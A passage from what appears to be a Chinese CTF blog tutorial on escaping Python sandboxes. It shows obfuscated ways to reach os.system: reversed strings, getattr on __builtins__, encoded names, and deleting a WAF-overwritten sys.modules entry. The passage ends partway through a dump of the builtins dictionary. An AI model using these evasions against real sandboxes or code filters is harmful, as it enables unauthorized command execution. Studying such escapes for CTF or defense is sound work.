<span class="token keyword">print</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen4<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 2.x  </span>

<span class="token keyword">import</span> os  
<span class="token builtin">getattr</span><span class="token punctuation">(</span>os<span class="token punctuation">,</span> <span class="token string">'metsys'</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span>

<span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token builtin">getattr</span><span class="token punctuation">(</span>__builtins__<span class="token punctuation">,</span> <span class="token string">'__tropmi__'</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'so'</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'metsys'</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h1 id="import"><a href="#import" class="headerlink" title="import"></a>import</h1><p>多种 import 方式</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
<span class="token keyword">import</span>  os
<span class="token keyword">import</span>   os

<span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span>

importlib<span class="token punctuation">.</span>import_module<span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span>

<span class="token builtin">execfile</span><span class="token punctuation">(</span><span class="token string">'/usr/lib/python2.7/os.py'</span><span class="token punctuation">)</span>	<span class="token comment"># python2</span>
system<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span>

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/usr/lib/python3.6/os.py'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>  
	<span class="token keyword">exec</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
system<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span>

<span class="token comment"># 库的路径获取：import sys;print(sys.path)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h1 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h1><p>字符串反转：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'so'</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>字符串拼接：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">a<span class="token operator">=</span><span class="token string">'o'</span><span class="token punctuation">;</span>b<span class="token operator">=</span><span class="token string">'s'</span><span class="token punctuation">;</span><span class="token builtin">__import__</span><span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>???：十六进制 vs unicode vs base64 vs 字符串拼接 vs 格式化字符串</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span> <span class="token operator">==</span> 
<span class="token punctuation">[</span><span class="token string">'\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f'</span><span class="token punctuation">]</span> <span class="token operator">==</span> 
<span class="token punctuation">[</span><span class="token string">u'\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f'</span><span class="token punctuation">]</span> <span class="token operator">==</span> 
<span class="token punctuation">[</span><span class="token string">'X19idWlsdGluc19f'</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">==</span> 
<span class="token punctuation">[</span><span class="token string">'__buil'</span><span class="token operator">+</span><span class="token string">'tins__'</span><span class="token punctuation">]</span> <span class="token operator">==</span> 
<span class="token punctuation">[</span><span class="token string">'__buil'</span><span class="token string">'tins__'</span><span class="token punctuation">]</span> <span class="token operator">==</span> 
<span class="token punctuation">[</span><span class="token string">'__buil'</span><span class="token punctuation">.</span>__add__<span class="token punctuation">(</span><span class="token string">'tins__'</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">==</span> 
<span class="token punctuation">[</span><span class="token string">"_builtins_"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">"__"</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">==</span> 
<span class="token punctuation">[</span><span class="token string">'%c%c%c%c%c%c%c%c%c%c%c%c'</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h1 id="核心模块"><a href="#核心模块" class="headerlink" title="核心模块"></a>核心模块</h1><h2 id="sys-modules"><a href="#sys-modules" class="headerlink" title="sys.modules"></a>sys.modules</h2><p><code>sys.modules</code> 是一个字典，里面储存了加载过的模块信息。如果 Python 是刚启动的话，所列出的模块就是解释器在启动时自动加载的模块。</p>
<p>有些库例如 <code>os</code> 是默认被加载进来的，但是不能直接使用（但是可以通过 <code>sys.modules</code> 来使用，例如 <code>sys.modules[&quot;os&quot;]</code>），原因在于 <strong>sys.modules 中未经 import 加载的模块对当前空间是不可见的</strong>。</p>
<h3 id="del-重载"><a href="#del-重载" class="headerlink" title="del 重载"></a>del 重载</h3><p>一些 waf 会直接在 sys.modules 上动刀，直接把库覆写</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'not allowed'</span>  
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> os  
<span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span>  
Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>  
File <span class="token string">"&lt;stdin>"</span><span class="token punctuation">,</span> line <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>  
AttributeError<span class="token punctuation">:</span> <span class="token string">'str'</span> <span class="token builtin">object</span> has no attribute <span class="token string">'system'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>此时 os 就废了</p>
<p>需要注意的是此处不能用 <code>del sys.modules[&#39;os&#39;]</code>，原因：当 import 一个模块时：import A，会先检查 sys.modules 中是否已经有 A；如果有则不加载，如果没有则为 A 创建 module 对象，并加载 A</p>
<p>所以删了 <code>sys.modules[&#39;os&#39;]</code> 再导入只会让 Python 重新加载一次 os</p>
<p>那么针对上面的覆写也就有了对策，直接 del 掉它覆写的 os，重新 import 即可：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">del</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span>  
<span class="token keyword">import</span> os  
os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>还有使用 builtins 导入的方法</p>
<hr>
<h2 id="builtins"><a href="#builtins" class="headerlink" title="builtins"></a>builtins</h2><p>Python 中有很多函数不需要 import 就能直接使用，例如 <code>chr</code>、<code>open</code>。之所以可以这样，是因为 Python 有个 <code>内建模块</code>（或者叫内建命名空间），它有一些常用函数，变量和类。</p>
<blockquote>
<p>Python 对函数、变量、类等等的查找方式是按 <code>LEGB</code> 规则（Local -&gt; Enclosed -&gt; Global -&gt; Built-in）来找的</p>
</blockquote>
<ul>
<li>builtin、__builtin__：Py2 中内建模块被命名为 <code>__builtin__</code>，需要 import 才能查看</li>
<li>builtins：Py3，需要 import 才能查看</li>
<li>__builtins__：Py2，Py3 两者都有</li>
</ul>
<p>在 __builtins__ 里有很多可以利用的函数，我们可以用 <code>__builtins__.__dict__</code> 查看</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token string">'__name__'</span><span class="token punctuation">:</span> <span class="token string">'builtins'</span>
 <span class="token string">'__doc__'</span><span class="token punctuation">:</span> <span class="token string">"Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices."</span>
 <span class="token string">'__package__'</span><span class="token punctuation">:</span> <span class="token string">''</span>
 <span class="token string">'__loader__'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib.BuiltinImporter'</span><span class="token operator">></span>
 <span class="token string">'__spec__'</span><span class="token punctuation">:</span> ModuleSpec<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'builtins'</span><span class="token punctuation">,</span> loader<span class="token operator">=</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib.BuiltinImporter'</span><span class="token operator">></span><span class="token punctuation">,</span> origin<span class="token operator">=</span><span class="token string">'built-in'</span><span class="token punctuation">)</span>
 <span class="token string">'__build_class__'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function __build_class__<span class="token operator">></span>
 <span class="token string">'__import__'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">__import__</span><span class="token operator">></span>
 <span class="token string">'abs'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">abs</span><span class="token operator">></span>
 <span class="token string">'all'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">all</span><span class="token operator">></span>
 <span class="token string">'any'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">any</span><span class="token operator">></span>
 <span class="token string">'ascii'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">ascii</span><span class="token operator">></span>
 <span class="token string">'bin'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">bin</span><span class="token operator">></span>
 <span class="token string">'breakpoint'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function breakpoint<span class="token operator">></span>
 <span class="token string">'callable'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">callable</span><span class="token operator">></span>
 <span class="token string">'chr'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">chr</span><span class="token operator">></span>
 <span class="token string">'compile'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">compile</span><span class="token operator">></span>
 <span class="token string">'delattr'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">delattr</span><span class="token operator">></span>
 <span class="token string">'dir'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">dir</span><span class="token operator">></span>
 <span class="token string">'divmod'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">divmod</span><span class="token operator">></span>
 <span class="token string">'eval'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">eval</span><span class="token operator">></span>
 <span class="token string">'exec'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token keyword">exec</span><span class="token operator">></span>
 <span class="token string">'format'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">format</span><span class="token operator">></span>
 <span class="token string">'getattr'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">getattr</span><span class="token operator">></span>
 <span class="token string">'globals'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">globals</span><span class="token operator">></span>
 <span class="token string">'hasattr'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">hasattr</span><span class="token operator">></span>
 <span class="token string">'hash'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">hash</span><span class="token operator">></span>
 <span class="token string">'hex'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">hex</span><span class="token operator">></span>
 <span class="token string">'id'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">id</span><span class="token operator">></span>
 <span class="token string">'input'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">input</span><span class="token operator">></span>
 <span class="token string">'isinstance'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">isinstance</span><span class="token operator">></span>
 <span class="token string">'issubclass'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">issubclass</span><span class="token operator">></span>
 <span class="token string">'iter'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">iter</span><span class="token operator">></span>
 <span class="token string">'len'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">len</span><span class="token operator">></span>
 <span class="token string">'locals'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">locals</span><span class="token operator">></span>
 <span class="token string">'max'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">max</span><span class="token operator">></span>
 <span class="token string">'min'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">min</span><span class="token operator">></span>
 <span class="token string">'next'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">next</span><span class="token operator">></span>
 <span class="token string">'oct'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">oct</span><span class="token operator">></span>
 <span class="token string">'ord'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">ord</span><span class="token operator">></span>
 <span class="token string">'pow'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">pow</span><span class="token operator">></span>
 <span class="token string">'print'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token keyword">print</span><span class="token operator">></span>
 <span class="token string">'repr'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">repr</span><span class="token operator">></span>
 <span class="token string">'round'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">round</span><span class="token operator">></span>
 <span class="token string">'setattr'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">setattr</span><span class="token operator">></span>
 <span class="token string">'sorted'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">sorted</span><span class="token operator">></span>
 <span class="token string">'sum'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">sum</span><span class="token operator">></span>
 <span class="token string">'vars'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">vars</span><span class="token operator">></span>
 <span class="token string">'None'</span><span class="token punctuation">:</span> <span class="token boolean">None</span>
 <span class="token string">'Ellipsis'</span><span class="token punctuation">:</span> Ellipsis
 <span class="token string">'NotImplemented'</span><span class="token punctuation">:</span> NotImplemented
 <span class="token string">'False'</span><span class="token punctuation">:</span> <span class="token boolean">False</span>
 <span class="token string">'True'</span><span class="token punctuation">:</span> <span class="token boolean">True</span>
 <span class="token string">'bool'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'bool'</span><span class="token operator">></span>
 <span class="token string">'memoryview'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'memoryview'</span><span class="token operator">></span>
 <span class="token string">'bytearray'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'bytearray'</span><span class="token operator">></span>
 <span class="token string">'bytes'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'bytes'</span><span class="token operator">></span>
 <span class="token string">'classmethod'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'classmethod'</span><span class="token operator">></span>
 <span class="token string">'complex'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'complex'</span><span class="token operator">></span>
 <span class="token string">'dict'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict'</span><span class="token operator">></span>
 <span class="token string">'enumerate'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'enumerate'</span><span class="token operator">></span>
 <span class="token string">'filter'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'filter'</span><span class="token operator">></span>
 <span class="token string">'float'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'float'</span><span class="token operator">></span>
 <span class="token string">'frozenset'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'frozenset'</span><span class="token operator">></span>
 <span class="token string">'property'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'property'</span><span class="token operator">></span>
 <span class="token string">'int'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'int'</span><span class="token operator">></span>
 <span class="token string">'list'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'list'</span><span class="token operator">></span>
 <span class="token string">'map'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'map'</span><span class="token operator">></span>
 <span class="token string">'object'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">></span>
 <span class="token string">'range'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'range'</span><span class="token operator">></span>
 <span class="token string">'reversed'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'reversed'</span><span class="token operator">></span>
 <span class="token string">'set'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'set'</span><span class="token operator">></span>
 <span class="token string">'slice'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'slice'</span><span class="token operator">></span>
 <span class="token string">'staticmethod'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'staticmethod'</span><span class="token operator">></span>
 <span class="token string">'str'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'str'</span><span class="token operator">></span>
 <span class="token string">'super'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'super'</span><span class="token operator">></span>
 <span class="token string">'tuple'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'tuple'</span><span class="token operator">></span>
 <span class="token string">'type'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'type'</span><span class="token operator">></span>
 <span class="token string">'zip'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'zip'</span><span class="token operator">></span>
 <span class="token string">'__debug__'</span><span class="token punctuation">:</span> <span class="token boolean">True</span>
 <span class="token string">'BaseException'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'BaseException'</span><span class="token operator">></span>
 <span class="token string">'Exception'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'Exception'</span><span class="token operator">></span>
 <span class="token string">'TypeError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'TypeError'</span><span class="token operator">></span>
 <span class="token string">'StopAsyncIteration'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'StopAsyncIteration'</span><span class="token operator">></span>
 <span class="token string">'StopIteration'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'StopIteration'</span><span class="token operator">></span>
 <span class="token string">'GeneratorExit'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'GeneratorExit'</span><span class="token operator">></span>
 <span class="token string">'SystemExit'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'SystemExit'</span><span class="token operator">></span>
 <span class="token string">'KeyboardInterrupt'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'KeyboardInterrupt'</span><span class="token operator">></span>
 <span class="token string">'ImportError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ImportError'</span><span class="token operator">></span>
 <span class="token string">'ModuleNotFoundError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ModuleNotFoundError'</span><span class="token operator">></span>
 <span class="token string">'OSError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'OSError'</span><span class="token operator">></span>
 <span class="token string">'EnvironmentError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'OSError'</span><span class="token operator">></span>
 <span class="token string">'IOError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'OSError'</span><span class="token operator">></span>
 <span class="token string">'EOFError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'EOFError'</span><span class="token operator">></span>
 <span class="token string">'RuntimeError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'RuntimeError'</span><span class="token operator">></span>
 <span class="token string">'RecursionError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'RecursionError'</span><span class="token operator">></span>
 <span class="token string">'NotImplementedError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'NotImplementedError'</span><span class="token operator">></span>
 <span class="token string">'NameError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'NameError'</span><span class="token operator">></span>
 <span class="token string">'UnboundLocalError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'UnboundLocalError'</span><span class="token operator">></span>
 <span class="token string">'AttributeError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'AttributeError'</span><span class="token operator">></span>
 <span class="token string">'SyntaxError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'SyntaxError'</span><span class="token operator">></span>
 <span class="token string">'IndentationError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'IndentationError'</span><span class="token operator">></span>
 <span class="token string">'TabError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'TabError'</span><span class="token operator">></span>
 <span class="token string">'LookupError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'LookupError'</span><span class="token operator">></span>
 <span class="token string">'IndexError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'IndexError'</span><span class="token operator">></span>
 <span class="token string">'KeyError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'KeyError'</span><span class="token operator">></span>
 <span class="token string">'ValueError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ValueError'</span><span class="token operator">></span>
 <span class="token string">'UnicodeError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'UnicodeError'</span><span class="token operator">></span>
 <span class="token string">'UnicodeEncodeError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'UnicodeEncodeError'</span><span class="token operator">></span>
 <span class="token string">'UnicodeDecodeError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'UnicodeDecodeError'</span><span class="token operator">></span>
 <span class="token string">'UnicodeTranslateError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'UnicodeTranslateError'</span><span class="token operator">></span>
 <span class="token string">'AssertionError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'AssertionError'</span><span class="token operator">></span>
 <span class="token string">'ArithmeticError'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ArithmeticError'</span><span class="token operator">></span>
